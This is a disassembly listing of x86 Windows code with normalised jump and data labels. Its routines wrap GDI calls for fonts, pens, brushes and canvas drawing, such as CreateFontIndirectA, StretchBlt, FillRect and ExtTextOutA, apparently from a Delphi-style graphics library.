mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4209a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4213d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_421493
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421098
xor eax eax
push ebp
push sub_421476
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420ad0
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_421514
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42147d
mov eax [ ebp - 0x8 ]
call sub_4210a8
retn
mov eax ebx
call sub_421798
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4217b4
sub_4214c4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_421509
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421510
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421528
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4216b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4216b8
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404450
retn
mov eax [ rw-data ]
call sub_4208ac
xor eax eax
push ebp
push sub_421689
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4208b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404688
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_409054
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404688
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_409054
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404688
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408800
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_42180c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_4216d0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_42128c
mov edx esp
mov eax ebx
call sub_4214c4
add esp 0x2c
pop esi
pop ebx
retn
sub_4216fc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4214ac
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4214c4
add esp 0x2c
pop esi
pop ebx
retn
sub_42173c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4214ac
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402fc4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4046c0
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402eb4
mov edx esp
mov eax ebx
call sub_4214c4
sub_4217b4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4216fc
pop esi
pop ebx
retn
sub_4217e0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4214ac
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4214c4
add esp 0x30
pop ebx
retn
sub_421814
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4214ac
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4214c4
add esp 0x2c
pop esi
pop ebx
retn
sub_421844
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4214ac
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4214c4
add esp 0x2c
pop esi
pop ebx
retn
sub_42186c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4208c4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4218b0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4209a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4218d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_421977
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421098
xor eax eax
push ebp
push sub_42195a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420ad0
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_421ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421961
mov eax [ ebp - 0x8 ]
call sub_4210a8
retn
sub_421990
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4219a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_4219ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219f4
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421a00
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_421990
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4219a8
add esp 0x10
pop esi
pop ebx
retn
sub_421a28
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4208ac
xor eax eax
push ebp
push sub_421aae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4208b8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_421054
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_421adc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_421990
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4219a8
add esp 0x10
pop esi
pop ebx
retn
sub_421b0c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_421990
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4219a8
sub_421b38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4208c4
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_421b78
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4209a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_421ba0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_421c30
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421098
xor eax eax
push ebp
push sub_421c13
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c1a
mov eax [ ebp - 0x8 ]
call sub_4210a8
retn
sub_421c48
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_421c64
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421098
xor eax eax
push ebp
push sub_421ca9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421cb0
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421cb4
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_421c64
add esp 0x10
pop edi
pop esi
retn
sub_421ce0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_421c48
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_421c64
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_421d14
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4208ac
xor edx edx
push ebp
push sub_421de1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4208b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_421054
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_421dfc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_421c48
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_421c64
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_421e30
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422730
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42186c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422750
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b38
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422770
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4167ac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_421ef4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_416848
xor edx edx
mov eax esi
call sub_422568
mov eax [ esi + 0xc ]
call sub_4036c0
mov eax [ esi + 0x10 ]
call sub_4036c0
mov eax [ esi + 0x14 ]
call sub_4036c0
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_421f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4225bc
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_421fd8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax [ ebx + 0x14 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_414b64
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_422084
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax [ ebx + 0x14 ]
call sub_421d14
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4220c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax [ ebx + 0x14 ]
call sub_421d14
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4220fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42215c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_422188
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4221c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_422210
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42224c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_4224e8
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_422278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax ebx
call sub_42224c
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_422348
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42215c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_422348
inc eax
add edi eax
sub_422304
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4046e4
push eax
mov eax edi
call sub_4048dc
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_422348
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_422304
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_422364
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_422304
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_422384
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4223d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223d7
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_422134
sub_422430
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_422454
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_42215c
pop ecx
pop edx
pop edi
pop esi
retn
sub_422474
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_4224a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_4225bc
mov eax [ ebp + 0x8 ]
call sub_421054
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_422508
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_422568
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_422508
mov edx esp
mov eax ebx
call sub_422430
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_422454
sub_4225bc
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_422658
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
test bl 0x8
je r-xdata
mov eax esi
call sub_422684
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_4226b4
sub_422658
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_421528
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
